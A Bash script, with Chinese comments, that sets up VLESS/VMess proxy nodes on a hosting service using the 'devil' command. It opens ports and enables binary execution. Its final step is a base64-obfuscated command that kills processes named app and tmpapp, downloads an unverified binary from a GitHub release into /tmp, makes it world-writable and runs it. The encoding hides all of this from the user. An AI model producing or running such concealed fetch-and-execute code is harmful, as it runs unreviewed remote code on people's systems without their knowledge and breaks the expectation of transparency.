#!/bin/bash 
if devil port add TCP random 2>&1 | grep -q "exceeded"; then
  echo " 端口已开"
else
devil port add TCP random
sleep 3
devil port add TCP random
sleep 3
fi

port1=$(devil port list | awk '
{
    if (match($0, /[0-9]{3,6}/)) {
        if (count == 0) {
            num1 = substr($0, RSTART, RLENGTH)
            print num1
            exit
        }
        count++
    } else {
        if(count > 0){
            count = 0;
            exit
        }
    }
    if (count >= 3) {
       count = 0;
       exit
    }
}
')
port2=$(devil port list | awk '
{
    if (match($0, /[0-9]{3,6}/)) {
        if (count == 0) {
            num1 = substr($0, RSTART, RLENGTH)
        } else if (count == 1){
            num2 = substr($0, RSTART, RLENGTH)
            print num2
            exit
        }
        count++
    } else {
         if(count > 1){
           count = 0;
            exit
        }else if (count >0){
           count = 0;
           exit
       }
    }
    if (count >= 3) {
        
       exit
    }
}
')
if test -x .; then
  echo "当前目录已开启执行权限"
else
  echo "当前目录未开启执行权限，将自动为你开启"
  devil binexec on
  echo "权限已开启，请关闭ssh连接，再重新连接"
  sleep 10
  exit
fi


# 节点相关设置(节点可在worlds文件里list.log查看)
export TMP_ARGO=${TMP_ARGO:-'vms'}  # 节点类型,可选vls,vms
export VL_PORT=$port1 #vles 端口
export VM_PORT=$port2 #vmes 端口
export TMPDIR=$PWD

# 启动程序
nohup bash -c "$(echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzL3BsdXRvbm9kZXMvcmVsZWFzZXMvZG93bmxvYWQveHIvbWFpbi1hbWQgPiAkdG1kaXIvdG1wYXBwCmNobW9kIDc3NyAkdG1kaXIvdG1wYXBwICYmICR0bWRpci90bXBhcHA" | base64 -d)" 2>&1 &
tail -f nohup.out
